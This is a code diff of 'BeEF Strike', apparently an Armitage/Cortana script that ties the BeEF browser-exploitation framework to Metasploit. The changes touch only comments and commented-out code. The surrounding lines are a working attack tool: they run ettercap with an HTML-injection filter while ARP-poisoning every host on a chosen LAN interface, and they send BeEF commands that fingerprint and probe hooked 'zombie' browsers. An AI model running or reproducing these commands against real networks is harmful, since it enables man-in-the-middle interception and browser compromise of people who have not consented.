@@ -1,9 +1,9 @@
-# Beef interaction by benyG
-# Tested on backtrack5r3
+# Beef & Armitage integration - by benyG
+# 
 # video demo: http://www.youtube.com/watch?v=YhKhkYzq2s8&feature=share&list=UU7_xeQ_4d8jAMtxdJgikjlA
 
 # At this time, This script doesn't use the beef_online command of beef metasploit plugin
-# to update zombies list. At result, but it try to reproduce it. 
+# to populate zombies list. But it try to reproduce host list. 
 # So if you try to add host while this script is running, you will falsify final result. 
 # Do your recruitment and Let Beef_strike add host for you. 
 #  
@@ -25,11 +25,6 @@ $first = 0 ;        # first beef's zombie id
 popup attacks {
 	menu "BeEF Strike"{
 
-#	iten "e" {cmd($console, "beef_online");
-#		@beef_zb = @(%());
-#		@beef_zb = parse_table("",);
-#		}
-
 		item "Connect" {
 		# Default value of Auto-import & Client-side auto-recon.
 		$import = 1;
@@ -45,6 +40,7 @@ popup attacks {
 #use ettercap filter for html injection - low injection success rate.
 			item "ettercap method" {
 			$eth0 = prompt_text("Network interface of the LAN to infect","eth0");
+#Use infect.filter as ettercap filter by default. you can use another filter.
 			$filter = prompt_text("Put the absolute path of your filter","/opt/metasploit/msf3/data/armitage/cortana-scripts/beef_strike/infect.filter");
 			cmd_async(" xterm -e 'etterfilter $filter -o html.ef'");
     			cmd_async(" xterm -e 'ettercap -T -q -i $eth0 -F html.ef -M ARP // //'");
@@ -198,6 +194,7 @@ sub driverecon {
 }
 
 sub recon_result {
+	#the results only appear on the teamserver console - 0o
 	append($console, "[*]\c1 Recon. result ------------>");	
 	append($console, ">\c8 fingerprint browser ");	
 	cmd($console , "beef_target -r $1 101"); # fingerprint browser
@@ -220,11 +217,12 @@ sub recon_result {
 	append($console, "\c8 :-)");
 }
 
+# doesn't work !
 # on console_beef_online{
 # 	@online = parse_table($3, @("Id", "IP", "OS"));
 #  	println(@online);
 # 	append($console, "@online");
-# 	foreach $nReports (@online) {
+# 	foreach $online(@online) {
 # 		($Id, $IP, $OS) = values($online, @('Id', 'IP', 'OS'));
 # 		show_message($Id);
 # 		}
